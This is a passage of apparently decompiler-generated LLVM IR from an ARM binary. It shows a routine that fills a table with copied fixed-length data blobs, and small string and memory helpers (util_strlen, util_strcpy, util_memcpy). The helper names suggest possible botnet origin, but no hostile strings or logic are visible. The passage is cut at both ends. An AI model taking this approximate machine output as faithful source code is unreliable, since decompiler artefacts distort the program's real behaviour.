  %v0_11d18 = load i32, i32* @fp, align 4
  store i32 %v0_11d10, i32* @r5, align 4
  %v4_11d20 = call i32 @util_memcpy(i32 %v0_11d10, i32 ptrtoint ([12 x i8]* @global_var_1b794.421 to i32), i32 %v0_11d18)
  store i32 6, i32* @r0, align 4
  %v0_11d28 = load i32, i32* @r5, align 4
  store i32 %v0_11d28, i32* @global_var_26f04.422, align 4
  %v0_11d2c = load i32, i32* @fp, align 4
  %v1_11d2c = trunc i32 %v0_11d2c to i16
  store i16 %v1_11d2c, i16* bitcast (i32* @global_var_26f08.423 to i16*), align 4
  %v0_11d30 = call i32 @malloc()
  store i32 %v0_11d30, i32* @r5, align 4
  %v4_11d40 = call i32 @util_memcpy(i32 %v0_11d30, i32 ptrtoint ([7 x i8]* @global_var_1b7a0.425 to i32), i32 6)
  %v0_11d48 = load i32, i32* @r6, align 4
  store i32 %v0_11d48, i32* @r0, align 4
  %v0_11d4c = load i32, i32* @r5, align 4
  store i32 %v0_11d4c, i32* @global_var_26f1c.426, align 4
  store i16 6, i16* bitcast (i32* @global_var_26f20.427 to i16*), align 4
  %v0_11d54 = call i32 @malloc()
  %v0_11d58 = load i32, i32* @r6, align 4
  store i32 %v0_11d54, i32* @r5, align 4
  %v4_11d64 = call i32 @util_memcpy(i32 %v0_11d54, i32 ptrtoint ([8 x i8]* @global_var_1b7a8.429 to i32), i32 %v0_11d58)
  %v0_11d68 = load i32, i32* @r6, align 4
  store i32 %v0_11d68, i32* @r0, align 4
  %v0_11d6c = load i32, i32* @r5, align 4
  store i32 %v0_11d6c, i32* @global_var_26f24.430, align 4
  %v1_11d70 = trunc i32 %v0_11d68 to i16
  store i16 %v1_11d70, i16* bitcast (i32* @global_var_26f28.431 to i16*), align 4
  %v0_11d74 = call i32 @malloc()
  %v0_11d78 = load i32, i32* @r6, align 4
  store i32 %v0_11d74, i32* @r5, align 4
  %v4_11d84 = call i32 @util_memcpy(i32 %v0_11d74, i32 ptrtoint ([8 x i8]* @global_var_1b7b0.433 to i32), i32 %v0_11d78)
  store i32 3, i32* @r0, align 4
  %v0_11d8c = load i32, i32* @r5, align 4
  store i32 %v0_11d8c, i32* @global_var_26f2c.434, align 4
  %v0_11d90 = load i32, i32* @r6, align 4
  %v1_11d90 = trunc i32 %v0_11d90 to i16
  store i16 %v1_11d90, i16* bitcast (i32* @global_var_26f30.435 to i16*), align 4
  %v0_11d94 = call i32 @malloc()
  store i32 %v0_11d94, i32* @r5, align 4
  %v4_11da4 = call i32 @util_memcpy(i32 %v0_11d94, i32 ptrtoint ([4 x i8]* @global_var_1b7b8.437 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_26f38.438 to i16*), align 4
  %v0_11db4 = load i32, i32* @r5, align 4
  store i32 %v0_11db4, i32* @global_var_26f34.439, align 4
  %v0_11db8 = call i32 @malloc()
  store i32 %v0_11db8, i32* @r5, align 4
  %v3_11dc8 = call i32 @util_memcpy(i32 %v0_11db8, i32 ptrtoint (i32* @global_var_1b7bc.441 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_11dd4 = load i32, i32* @r5, align 4
  store i32 %v0_11dd4, i32* @global_var_26f3c.442, align 4
  store i16 19, i16* bitcast (i32* @global_var_26f40.443 to i16*), align 4
  %v0_11ddc = call i32 @malloc()
  store i32 %v0_11ddc, i32* @r5, align 4
  %v3_11dec = call i32 @util_memcpy(i32 %v0_11ddc, i32 ptrtoint (i32* @global_var_1b7d0.445 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_26f48.446 to i16*), align 4
  %v0_11dfc = load i32, i32* @r5, align 4
  store i32 %v0_11dfc, i32* @global_var_26f44.447, align 4
  %v0_11e00 = call i32 @malloc()
  store i32 %v0_11e00, i32* @r5, align 4
  store i32 9, i32* @r8, align 4
  %v4_11e14 = call i32 @util_memcpy(i32 %v0_11e00, i32 ptrtoint ([10 x i8]* @global_var_1b7ec.449 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_11e1c = load i32, i32* @r5, align 4
  store i32 %v0_11e1c, i32* @global_var_26f4c.450, align 4
  %v0_11e20 = load i32, i32* @r8, align 4
  %v1_11e20 = trunc i32 %v0_11e20 to i16
  store i16 %v1_11e20, i16* bitcast (i32* @global_var_26f50.451 to i16*), align 4
  %v0_11e24 = call i32 @malloc()
  store i32 %v0_11e24, i32* @r5, align 4
  store i32 16, i32* @sb, align 4
  %v3_11e38 = call i32 @util_memcpy(i32 %v0_11e24, i32 ptrtoint (i32* @global_var_1b7f8.453 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_11e40 = load i32, i32* @r5, align 4
  store i32 %v0_11e40, i32* @global_var_26f54.454, align 4
  %v0_11e44 = load i32, i32* @sb, align 4
  %v1_11e44 = trunc i32 %v0_11e44 to i16
  store i16 %v1_11e44, i16* bitcast (i32* @global_var_26f58.455 to i16*), align 4
  %v0_11e48 = call i32 @malloc()
  store i32 %v0_11e48, i32* @r5, align 4
  %v3_11e58 = call i32 @util_memcpy(i32 %v0_11e48, i32 ptrtoint (i32* @global_var_1b80c.457 to i32), i32 22)
  store i32 21, i32* @r0, align 4
  %v0_11e64 = load i32, i32* @r5, align 4
  store i32 %v0_11e64, i32* @global_var_26f5c.458, align 4
  store i16 22, i16* bitcast (i32* @global_var_26f60.459 to i16*), align 4
  %v0_11e6c = call i32 @malloc()
  store i32 %v0_11e6c, i32* @r5, align 4
  %v3_11e7c = call i32 @util_memcpy(i32 %v0_11e6c, i32 ptrtoint (i32* @global_var_1b824.461 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_26f68.462 to i16*), align 4
  %v0_11e8c = load i32, i32* @r5, align 4
  store i32 %v0_11e8c, i32* @global_var_26f64.463, align 4
  %v0_11e90 = call i32 @malloc()
  store i32 %v0_11e90, i32* @r5, align 4
  %v4_11ea0 = call i32 @util_memcpy(i32 %v0_11e90, i32 ptrtoint ([18 x i8]* @global_var_1b83c.465 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  %v0_11eac = load i32, i32* @r5, align 4
  store i32 %v0_11eac, i32* @global_var_26f6c.466, align 4
  store i16 17, i16* bitcast (i32* @global_var_26f70.467 to i16*), align 4
  %v0_11eb4 = call i32 @malloc()
  %v0_11ec0 = load i32, i32* @r6, align 4
  %v1_11ec0 = add i32 %v0_11ec0, 5
  store i32 %v1_11ec0, i32* @r6, align 4
  store i32 %v0_11eb4, i32* @r5, align 4
  %v3_11ec8 = call i32 @util_memcpy(i32 %v0_11eb4, i32 ptrtoint (i32* @global_var_1b850.469 to i32), i32 12)
  store i32 23, i32* @r0, align 4
  %v0_11ed0 = load i32, i32* @r5, align 4
  store i32 %v0_11ed0, i32* @global_var_26f74.470, align 4
  %v0_11ed4 = load i32, i32* @r6, align 4
  %v1_11ed4 = trunc i32 %v0_11ed4 to i16
  store i16 %v1_11ed4, i16* bitcast (i32* @global_var_26f78.471 to i16*), align 4
  %v0_11ed8 = call i32 @malloc()
  store i32 %v0_11ed8, i32* @r5, align 4
  %v3_11ee8 = call i32 @util_memcpy(i32 %v0_11ed8, i32 ptrtoint (i32* @global_var_1b860.473 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_11ef8 = load i32, i32* @r4, align 4
  %v4_11ef8 = add i32 %v2_11ef8, 260
  %v5_11ef8 = inttoptr i32 %v4_11ef8 to i16*
  store i16 23, i16* %v5_11ef8, align 2
  %v0_11efc = load i32, i32* @r5, align 4
  store i32 %v0_11efc, i32* @global_var_26f7c.474, align 4
  %v0_11f00 = call i32 @malloc()
  store i32 %v0_11f00, i32* @r5, align 4
  %v3_11f10 = call i32 @util_memcpy(i32 %v0_11f00, i32 ptrtoint (i32* @global_var_1b878.476 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_11f20 = load i32, i32* @r4, align 4
  %v4_11f20 = add i32 %v2_11f20, 268
  %v5_11f20 = inttoptr i32 %v4_11f20 to i16*
  store i16 83, i16* %v5_11f20, align 2
  %v0_11f24 = load i32, i32* @r5, align 4
  store i32 %v0_11f24, i32* @global_var_26f84.477, align 4
  %v0_11f28 = call i32 @malloc()
  store i32 %v0_11f28, i32* @r5, align 4
  %v3_11f38 = call i32 @util_memcpy(i32 %v0_11f28, i32 ptrtoint (i32* @global_var_1b8cc.479 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_11f48 = load i32, i32* @r4, align 4
  %v4_11f48 = add i32 %v2_11f48, 276
  %v5_11f48 = inttoptr i32 %v4_11f48 to i16*
  store i16 32, i16* %v5_11f48, align 2
  %v0_11f4c = load i32, i32* @r5, align 4
  store i32 %v0_11f4c, i32* @global_var_26f8c.480, align 4
  %v0_11f50 = call i32 @malloc()
  store i32 %v0_11f50, i32* @r5, align 4
  %v3_11f60 = call i32 @util_memcpy(i32 %v0_11f50, i32 ptrtoint (i32* @global_var_1b8f0.482 to i32), i32 48)
  %v0_11f6c = load i32, i32* @r6, align 4
  store i32 %v0_11f6c, i32* @r0, align 4
  %v2_11f70 = load i32, i32* @r4, align 4
  %v4_11f70 = add i32 %v2_11f70, 284
  %v5_11f70 = inttoptr i32 %v4_11f70 to i16*
  store i16 48, i16* %v5_11f70, align 2
  %v0_11f74 = load i32, i32* @r5, align 4
  store i32 %v0_11f74, i32* @global_var_26f94.483, align 4
  %v0_11f78 = call i32 @malloc()
  %v0_11f7c = load i32, i32* @r6, align 4
  store i32 %v0_11f78, i32* @r5, align 4
  %v3_11f88 = call i32 @util_memcpy(i32 %v0_11f78, i32 ptrtoint (i32* @global_var_1b924.485 to i32), i32 %v0_11f7c)
  %v0_11f90 = load i32, i32* @r8, align 4
  store i32 %v0_11f90, i32* @r0, align 4
  %v0_11f94 = load i32, i32* @r6, align 4
  %v1_11f94 = trunc i32 %v0_11f94 to i16
  %v2_11f94 = load i32, i32* @r4, align 4
  %v4_11f94 = add i32 %v2_11f94, 292
  %v5_11f94 = inttoptr i32 %v4_11f94 to i16*
  store i16 %v1_11f94, i16* %v5_11f94, align 2
  %v0_11f98 = load i32, i32* @r5, align 4
  store i32 %v0_11f98, i32* @global_var_26f9c.486, align 4
  %v0_11f9c = call i32 @malloc()
  %v0_11fa4 = load i32, i32* @r8, align 4
  store i32 %v0_11f9c, i32* @r5, align 4
  %v3_11fac = call i32 @util_memcpy(i32 %v0_11f9c, i32 ptrtoint (i32* @global_var_1b934.488 to i32), i32 %v0_11fa4)
  %v0_11fb4 = load i32, i32* @r7, align 4
  store i32 %v0_11fb4, i32* @r0, align 4
  %v0_11fb8 = load i32, i32* @r8, align 4
  %v1_11fb8 = trunc i32 %v0_11fb8 to i16
  %v2_11fb8 = load i32, i32* @r4, align 4
  %v4_11fb8 = add i32 %v2_11fb8, 300
  %v5_11fb8 = inttoptr i32 %v4_11fb8 to i16*
  store i16 %v1_11fb8, i16* %v5_11fb8, align 2
  %v0_11fbc = load i32, i32* @r5, align 4
  store i32 %v0_11fbc, i32* @global_var_26fa4.489, align 4
  %v0_11fc0 = call i32 @malloc()
  %v0_11fc8 = load i32, i32* @r7, align 4
  store i32 %v0_11fc0, i32* @r5, align 4
  %v3_11fd0 = call i32 @util_memcpy(i32 %v0_11fc0, i32 ptrtoint (i32* @global_var_1b940.491 to i32), i32 %v0_11fc8)
  %v0_11fd8 = load i32, i32* @r6, align 4
  store i32 %v0_11fd8, i32* @r0, align 4
  %v0_11fdc = load i32, i32* @r7, align 4
  %v1_11fdc = trunc i32 %v0_11fdc to i16
  %v2_11fdc = load i32, i32* @r4, align 4
  %v4_11fdc = add i32 %v2_11fdc, 308
  %v5_11fdc = inttoptr i32 %v4_11fdc to i16*
  store i16 %v1_11fdc, i16* %v5_11fdc, align 2
  %v0_11fe0 = load i32, i32* @r5, align 4
  store i32 %v0_11fe0, i32* @global_var_26fac.492, align 4
  %v0_11fe4 = call i32 @malloc()
  %v0_11fe8 = load i32, i32* @r6, align 4
  store i32 %v0_11fe4, i32* @r5, align 4
  %v3_11ff4 = call i32 @util_memcpy(i32 %v0_11fe4, i32 ptrtoint (i32* @global_var_1b94c.494 to i32), i32 %v0_11fe8)
  %v0_11ffc = load i32, i32* @sb, align 4
  store i32 %v0_11ffc, i32* @r0, align 4
  %v0_12000 = load i32, i32* @r6, align 4
  %v1_12000 = trunc i32 %v0_12000 to i16
  %v2_12000 = load i32, i32* @r4, align 4
  %v4_12000 = add i32 %v2_12000, 316
  %v5_12000 = inttoptr i32 %v4_12000 to i16*
  store i16 %v1_12000, i16* %v5_12000, align 2
  %v0_12004 = load i32, i32* @r5, align 4
  store i32 %v0_12004, i32* @global_var_26fb4.495, align 4
  %v0_12008 = call i32 @malloc()
  %v0_12010 = load i32, i32* @sb, align 4
  store i32 %v0_12008, i32* @r5, align 4
  %v3_12018 = call i32 @util_memcpy(i32 %v0_12008, i32 ptrtoint (i32* @global_var_1b95c.497 to i32), i32 %v0_12010)
  store i32 19, i32* @r0, align 4
  %v0_12024 = load i32, i32* @sb, align 4
  %v1_12024 = trunc i32 %v0_12024 to i16
  %v2_12024 = load i32, i32* @r4, align 4
  %v4_12024 = add i32 %v2_12024, 324
  %v5_12024 = inttoptr i32 %v4_12024 to i16*
  store i16 %v1_12024, i16* %v5_12024, align 2
  %v0_12028 = load i32, i32* @r5, align 4
  store i32 %v0_12028, i32* @global_var_26fbc.498, align 4
  %v0_1202c = call i32 @malloc()
  store i32 %v0_1202c, i32* @r5, align 4
  %v3_1203c = call i32 @util_memcpy(i32 %v0_1202c, i32 ptrtoint (i32* @global_var_1b970.500 to i32), i32 19)
  %v0_12048 = load i32, i32* @sl, align 4
  store i32 %v0_12048, i32* @r0, align 4
  %v2_1204c = load i32, i32* @r4, align 4
  %v4_1204c = add i32 %v2_1204c, 332
  %v5_1204c = inttoptr i32 %v4_1204c to i16*
  store i16 19, i16* %v5_1204c, align 2
  %v0_12050 = load i32, i32* @r5, align 4
  store i32 %v0_12050, i32* @global_var_26fc4.501, align 4
  %v0_12054 = call i32 @malloc()
  %v0_1205c = load i32, i32* @sl, align 4
  store i32 %v0_12054, i32* @r5, align 4
  %v4_12064 = call i32 @util_memcpy(i32 %v0_12054, i32 ptrtoint ([9 x i8]* @global_var_1b984.503 to i32), i32 %v0_1205c)
  %v0_1206c = load i32, i32* @fp, align 4
  store i32 %v0_1206c, i32* @r0, align 4
  %v0_12070 = load i32, i32* @sl, align 4
  %v1_12070 = trunc i32 %v0_12070 to i16
  %v2_12070 = load i32, i32* @r4, align 4
  %v4_12070 = add i32 %v2_12070, 340
  %v5_12070 = inttoptr i32 %v4_12070 to i16*
  store i16 %v1_12070, i16* %v5_12070, align 2
  %v0_12074 = load i32, i32* @r5, align 4
  store i32 %v0_12074, i32* @global_var_26fcc.504, align 4
  %v0_12078 = call i32 @malloc()
  %v0_12080 = load i32, i32* @fp, align 4
  store i32 %v0_12078, i32* @r5, align 4
  %v3_12088 = call i32 @util_memcpy(i32 %v0_12078, i32 ptrtoint (i32* @global_var_1b86c.506 to i32), i32 %v0_12080)
  %v0_12090 = load i32, i32* @r6, align 4
  store i32 %v0_12090, i32* @r0, align 4
  %v0_12094 = load i32, i32* @fp, align 4
  %v1_12094 = trunc i32 %v0_12094 to i16
  %v2_12094 = load i32, i32* @r4, align 4
  %v4_12094 = add i32 %v2_12094, 348
  %v5_12094 = inttoptr i32 %v4_12094 to i16*
  store i16 %v1_12094, i16* %v5_12094, align 2
  %v0_12098 = load i32, i32* @r5, align 4
  store i32 %v0_12098, i32* @global_var_26fd4.507, align 4
  %v0_1209c = call i32 @malloc()
  %v0_120a0 = load i32, i32* @r6, align 4
  store i32 %v0_1209c, i32* @r5, align 4
  %v3_120ac = call i32 @util_memcpy(i32 %v0_1209c, i32 ptrtoint (i32* @global_var_1b990.509 to i32), i32 %v0_120a0)
  store i32 18, i32* @r0, align 4
  %v0_120b8 = load i32, i32* @r6, align 4
  %v1_120b8 = trunc i32 %v0_120b8 to i16
  %v2_120b8 = load i32, i32* @r4, align 4
  %v4_120b8 = add i32 %v2_120b8, 356
  %v5_120b8 = inttoptr i32 %v4_120b8 to i16*
  store i16 %v1_120b8, i16* %v5_120b8, align 2
  %v0_120bc = load i32, i32* @r5, align 4
  store i32 %v0_120bc, i32* @global_var_26fdc.510, align 4
  %v0_120c0 = call i32 @malloc()
  store i32 %v0_120c0, i32* @r5, align 4
  %v3_120d0 = call i32 @util_memcpy(i32 %v0_120c0, i32 ptrtoint (i32* @global_var_1b9a0.512 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_120e0 = load i32, i32* @r4, align 4
  %v4_120e0 = add i32 %v2_120e0, 364
  %v5_120e0 = inttoptr i32 %v4_120e0 to i16*
  store i16 18, i16* %v5_120e0, align 2
  %v0_120e4 = load i32, i32* @r5, align 4
  store i32 %v0_120e4, i32* @global_var_26fe4.513, align 4
  %v0_120e8 = call i32 @malloc()
  store i32 %v0_120e8, i32* %r5.global-to-local, align 4
  %v3_120f8 = call i32 @util_memcpy(i32 %v0_120e8, i32 ptrtoint (i32* @global_var_1b9b4.515 to i32), i32 25)
  store i32 111, i32* @r0, align 4
  %v2_12108 = load i32, i32* @r4, align 4
  %v4_12108 = add i32 %v2_12108, 372
  %v5_12108 = inttoptr i32 %v4_12108 to i16*
  store i16 25, i16* %v5_12108, align 2
  %v0_1210c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1210c, i32* @global_var_26fec.516, align 4
  %v0_12110 = load i32, i32* @r0, align 4
  store i32 %v0_12110, i32* @r5, align 4
  %v0_12114 = call i32 @malloc()
  %v0_12118 = load i32, i32* @r5, align 4
  store i32 %v0_12114, i32* @r6, align 4
  %v3_12124 = call i32 @util_memcpy(i32 %v0_12114, i32 ptrtoint (i32* @global_var_1b9d0.518 to i32), i32 %v0_12118)
  %v0_1212c = load i32, i32* @r5, align 4
  store i32 %v0_1212c, i32* @r0, align 4
  %v1_12130 = trunc i32 %v0_1212c to i16
  %v2_12130 = load i32, i32* @r4, align 4
  %v4_12130 = add i32 %v2_12130, 380
  %v5_12130 = inttoptr i32 %v4_12130 to i16*
  store i16 %v1_12130, i16* %v5_12130, align 2
  %v0_12134 = load i32, i32* @r6, align 4
  store i32 %v0_12134, i32* @global_var_26ff4.519, align 4
  %v0_12138 = call i32 @malloc()
  %v0_1213c = load i32, i32* @r5, align 4
  store i32 %v0_12138, i32* @r6, align 4
  %v3_12148 = call i32 @util_memcpy(i32 %v0_12138, i32 ptrtoint (i32* @global_var_1ba40.521 to i32), i32 %v0_1213c)
  store i32 110, i32* @r0, align 4
  %v0_12154 = load i32, i32* @r5, align 4
  %v1_12154 = trunc i32 %v0_12154 to i16
  %v2_12154 = load i32, i32* @r4, align 4
  %v4_12154 = add i32 %v2_12154, 388
  %v5_12154 = inttoptr i32 %v4_12154 to i16*
  store i16 %v1_12154, i16* %v5_12154, align 2
  %v0_12158 = load i32, i32* @r6, align 4
  store i32 %v0_12158, i32* @global_var_26ffc.522, align 4
  %v0_1215c = load i32, i32* @r0, align 4
  store i32 %v0_1215c, i32* @r5, align 4
  %v0_12160 = call i32 @malloc()
  %v0_12164 = load i32, i32* @r5, align 4
  store i32 %v0_12160, i32* @r6, align 4
  %v3_12170 = call i32 @util_memcpy(i32 %v0_12160, i32 ptrtoint (i32* @global_var_1bab0.524 to i32), i32 %v0_12164)
  %v0_12178 = load i32, i32* @r5, align 4
  store i32 %v0_12178, i32* @r0, align 4
  %v1_1217c = trunc i32 %v0_12178 to i16
  %v2_1217c = load i32, i32* @r4, align 4
  %v4_1217c = add i32 %v2_1217c, 396
  %v5_1217c = inttoptr i32 %v4_1217c to i16*
  store i16 %v1_1217c, i16* %v5_1217c, align 2
  %v0_12180 = load i32, i32* @r6, align 4
  store i32 %v0_12180, i32* @global_var_27004.525, align 4
  %v0_12184 = call i32 @malloc()
  %v0_12188 = load i32, i32* @r5, align 4
  store i32 %v0_12184, i32* @r6, align 4
  %v3_12194 = call i32 @util_memcpy(i32 %v0_12184, i32 ptrtoint (i32* @global_var_1bb20.527 to i32), i32 %v0_12188)
  store i32 117, i32* @r0, align 4
  %v0_121a0 = load i32, i32* @r5, align 4
  %v1_121a0 = trunc i32 %v0_121a0 to i16
  %v2_121a0 = load i32, i32* @r4, align 4
  %v4_121a0 = add i32 %v2_121a0, 404
  %v5_121a0 = inttoptr i32 %v4_121a0 to i16*
  store i16 %v1_121a0, i16* %v5_121a0, align 2
  %v0_121a4 = load i32, i32* @r6, align 4
  store i32 %v0_121a4, i32* @global_var_2700c.528, align 4
  %v0_121a8 = call i32 @malloc()
  store i32 %v0_121a8, i32* %r5.global-to-local, align 4
  %v3_121b8 = call i32 @util_memcpy(i32 %v0_121a8, i32 ptrtoint (i32* @global_var_1bb90.530 to i32), i32 117)
  store i32 %v0_121a8, i32* @global_var_27014.531, align 4
  %v2_121c8 = load i32, i32* @r4, align 4
  %v4_121c8 = add i32 %v2_121c8, 412
  %v5_121c8 = inttoptr i32 %v4_121c8 to i16*
  store i16 117, i16* %v5_121c8, align 2
  store i32 %v3_11aac, i32* @r4, align 4
  store i32 %v6_11aac, i32* @r5, align 4
  store i32 %v9_11aac, i32* @r6, align 4
  store i32 %v12_11aac, i32* @r7, align 4
  store i32 %v15_11aac, i32* @r8, align 4
  store i32 %v18_11aac, i32* @sb, align 4
  store i32 %v24_11aac, i32* @fp, align 4
  ret i32 %v3_121b8

; uselistorder directives
  uselistorder i32 %v0_12184, { 1, 0 }
  uselistorder i32 %v0_12160, { 1, 0 }
  uselistorder i32 %v0_12138, { 1, 0 }
  uselistorder i32 %v0_12114, { 1, 0 }
  uselistorder i32 %v0_1209c, { 1, 0 }
  uselistorder i32 %v0_12078, { 1, 0 }
  uselistorder i32 %v0_12054, { 1, 0 }
  uselistorder i32 %v0_12008, { 1, 0 }
  uselistorder i32 %v0_11fe4, { 1, 0 }
  uselistorder i32 %v0_11fc0, { 1, 0 }
  uselistorder i32 %v0_11f9c, { 1, 0 }
  uselistorder i32 %v0_11f78, { 1, 0 }
  uselistorder i32 %v0_11eb4, { 1, 0 }
  uselistorder i32 %v0_11d74, { 1, 0 }
  uselistorder i32 %v0_11d54, { 1, 0 }
  uselistorder i32 %v0_11d10, { 1, 0 }
  uselistorder i32 %v0_11cf0, { 1, 0 }
  uselistorder i32 %v0_11cac, { 1, 0 }
  uselistorder i32 %v0_11c8c, { 1, 0 }
  uselistorder i32 %v0_11c40, { 1, 0 }
  uselistorder i32 %v0_11c20, { 1, 0 }
  uselistorder i32 %v0_11bd8, { 1, 0 }
  uselistorder i32 %v0_11b90, { 1, 0 }
  uselistorder i32 %v0_11b28, { 1, 0 }
  uselistorder i32 %v0_11ae0, { 1, 0 }
  uselistorder i32 %v0_11ab8, { 1, 0 }
  uselistorder i32 29, { 0, 5, 6, 3, 1, 2, 4 }
  uselistorder i32 23, { 0, 8, 1, 9, 2, 5, 3, 6, 4, 7 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 3, 2, 1, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_26e7c.345 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_122a8 = load i8, i8* %arg1, align 1
  %v2_122ac = icmp eq i8 %v3_122a8, 0
  %v0_122b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_122ac, i32 %v0_122b0)
  br label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %dec_label_pc_122b8, %entry
  %v0_122b8 = phi i32 [ %v1_122b8, %dec_label_pc_122b8 ], [ 0, %entry ]
  %v1_122b8 = add i32 %v0_122b8, 1
  %v2_122bc = add i32 %v1_122b8, %tmp
  %v3_122bc = inttoptr i32 %v2_122bc to i8*
  %v4_122bc = load i8, i8* %v3_122bc, align 1
  %v6_122bc = zext i8 %v4_122bc to i32
  store i32 %v6_122bc, i32* @r3, align 4
  %v2_122c0 = icmp eq i8 %v4_122bc, 0
  br i1 %v2_122c0, label %dec_label_pc_122c8, label %dec_label_pc_122b8

dec_label_pc_122c8:                               ; preds = %dec_label_pc_122b8
  ret i32 %v1_122b8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_122cc = load i8, i8* %arg1, align 1
  %v3_122cc = zext i8 %v2_122cc to i32
  store i32 %v3_122cc, i32* @r2, align 4
  %v2_122d0 = icmp eq i8 %v2_122cc, 0
  br i1 %v2_122d0, label %bb, label %dec_label_pc_122dc

bb:                                               ; preds = %entry
  store i32 %v3_122cc, i32* @ip, align 4
  br label %dec_label_pc_122f0

dec_label_pc_122dc:                               ; preds = %entry
  br label %dec_label_pc_122e0

dec_label_pc_122e0:                               ; preds = %dec_label_pc_122e0, %dec_label_pc_122dc
  %v0_122e0 = phi i32 [ %v1_122e0, %dec_label_pc_122e0 ], [ 0, %dec_label_pc_122dc ]
  %v1_122e0 = add i32 %v0_122e0, 1
  store i32 %v1_122e0, i32* @ip, align 4
  %v2_122e4 = add i32 %v1_122e0, %tmp
  %v3_122e4 = inttoptr i32 %v2_122e4 to i8*
  %v4_122e4 = load i8, i8* %v3_122e4, align 1
  %v2_122e8 = icmp eq i8 %v4_122e4, 0
  br i1 %v2_122e8, label %dec_label_pc_122f0, label %dec_label_pc_122e0

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122e0, %bb
  %v0_122f0 = phi i32 [ %v3_122cc, %bb ], [ %v1_122e0, %dec_label_pc_122e0 ]
  br label %dec_label_pc_122fc

dec_label_pc_122f8:                               ; preds = %dec_label_pc_122fc
  %v0_122f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_122f8 = add i32 %v0_122f8, 1
  %v2_122f8 = inttoptr i32 %v1_122f8 to i8*
  %v3_122f8 = load i8, i8* %v2_122f8, align 1
  %v4_122f8 = zext i8 %v3_122f8 to i32
  store i32 %v4_122f8, i32* @r2, align 4
  store i32 %v1_122f8, i32* %r1.global-to-local, align 4
  %v0_122fc.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_122fc

dec_label_pc_122fc:                               ; preds = %dec_label_pc_122f0, %dec_label_pc_122f8
  %v0_12304.off0 = phi i8 [ %v2_122cc, %dec_label_pc_122f0 ], [ %v3_122f8, %dec_label_pc_122f8 ]
  %v0_122fc = phi i32 [ %v0_122f0, %dec_label_pc_122f0 ], [ %v0_122fc.pr, %dec_label_pc_122f8 ]
  %v1_122fc = add i32 %v0_122fc, -1
  store i32 %v1_122fc, i32* @r3, align 4
  %v3_12300 = icmp eq i32 %v0_122fc, 0
  %v2_12304 = load i32, i32* @r0, align 4
  %v3_12304 = inttoptr i32 %v2_12304 to i8*
  store i8 %v0_12304.off0, i8* %v3_12304, align 1
  %v4_12304 = load i32, i32* @r0, align 4
  %v5_12304 = add i32 %v4_12304, 1
  store i32 %v5_12304, i32* @r0, align 4
  br i1 %v3_12300, label %dec_label_pc_1230c, label %dec_label_pc_122f8

dec_label_pc_1230c:                               ; preds = %dec_label_pc_122fc
  %v0_1230c = load i32, i32* @ip, align 4
  ret i32 %v0_1230c

; uselistorder directives
  uselistorder i32 %v0_122fc, { 1, 0 }
  uselistorder i32 %v1_122e0, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_122fc, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_12314 = icmp eq i32 %arg3, 0
  %v0_12318 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12314, i32 %v0_12318)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12320

dec_label_pc_12320:                               ; preds = %dec_label_pc_12320, %entry
  %v0_12320 = phi i32 [ %v1_12328, %dec_label_pc_12320 ], [ 0, %entry ]
  %v2_12320 = add i32 %v0_12320, %arg2
  %v3_12320 = inttoptr i32 %v2_12320 to i8*
  %v4_12320 = load i8, i8* %v3_12320, align 1
  %v4_12324 = add i32 %v0_12320, %arg1
  %v5_12324 = inttoptr i32 %v4_12324 to i8*
  store i8 %v4_12320, i8* %v5_12324, align 1
  %v0_12328 = load i32, i32* %ip.global-to-local, align 4
  %v1_12328 = add i32 %v0_12328, 1
  store i32 %v1_12328, i32* %ip.global-to-local, align 4
  %v9_1232c = icmp eq i32 %v1_12328, %arg3
  br i1 %v9_1232c, label %dec_label_pc_12334, label %dec_label_pc_12320

dec_label_pc_12334:                               ; preds = %dec_label_pc_12320
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12328, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_12338 = icmp eq i32 %arg2, 0
  %v0_1233c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12338, i32 %v0_1233c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12344

